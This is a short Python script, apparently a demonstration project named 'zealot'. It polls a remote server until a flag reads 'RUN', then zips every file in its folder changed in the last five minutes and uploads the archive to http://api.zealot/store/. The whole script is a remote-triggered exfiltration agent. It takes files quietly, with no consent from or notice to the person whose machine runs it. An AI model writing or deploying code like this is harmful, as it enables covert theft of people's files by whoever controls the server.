import glob
import os
import zipfile
import subprocess
import time
import datetime
import requests
 
# get flag status (WAIT/RUN)
response = requests.get('http://api.zealot/collect/')
# response = "WAIT" # DEBUG

changedFiles = [] # list of file pathes changed in last x minutes
path = os.path.dirname(os.path.realpath(__file__)) # get current path

while response.text != "RUN":
    print ("Flag is set to '%s'" % (response)) # debug print
    # log flag state
    # print ("Flag is set to '%s' at: %s" % (response, datetime.datetime.now()), file=open("zealotlog.txt", "a"))

    time.sleep(5)   # wait x seconds
    response = requests.get('http://api.zealot/collect/') # query flag, update value
    # response = "RUN" # DEBUG
    

print ("Flag is set to '%s'!" % (response.text)) # debug print
print ("Activity Detected!")    # for demonstration
print ("Executing...")    #for demonstration

# log flag state
# print ("Flag set to '%s' at: %s" % (response, datetime.datetime.now()), file=open("zealotlog.txt", "a"))

# create list of all files in directory
lstFiles = glob.glob('*', recursive=True)

#print (lstFiles) # DEBUG

# iterate list of files, compare modify time to current time
# if file was altered in last 5 minutes (300 seconds),
# add it to changedFiles
for i in lstFiles:
    fileStat = os.stat(i)
    if (time.time() - fileStat.st_mtime < 300.00):
        changedFiles.append(i)

#print (changedFiles) # DEBUG

# zip files together for transmission to server
with zipfile.ZipFile('changed.zip', 'w') as zipChanged:
    for f in changedFiles: # not changedFiles, contents of files at pathes specified in changedFiles
        zipChanged.write(f)

# send zip files to server
zipFile = {'file': open(path + '/changed.zip', 'rb')} # MAY NEED ADJUSTING
send = requests.post('http://api.zealot/store/', files=zipFile)
#send.text
